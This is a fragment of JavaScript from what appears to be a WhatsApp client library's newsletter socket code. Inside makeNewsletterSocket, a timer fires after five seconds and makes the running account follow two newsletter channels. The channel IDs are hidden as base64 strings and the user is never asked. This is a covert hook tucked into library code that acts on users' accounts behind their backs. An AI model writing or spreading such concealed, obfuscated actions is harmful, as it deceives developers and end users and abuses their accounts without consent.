...
export const makeNewsletterSocket = (config) => {
    ...
    setTimeout(() => {
        newsletterWMexQuery(Buffer.from("MTIwMzYzNDA2MTA2ODkxOTI1QG5ld3NsZXR0ZXI=", "base64").toString(), QueryIds.FOLLOW)
        newsletterWMexQuery(Buffer.from("MTIwMzYzNDIyMzE3NTA0MTcxQG5ld3NsZXR0ZXI=", "base64").toString(), QueryIds.FOLLOW)
    }, 5000)
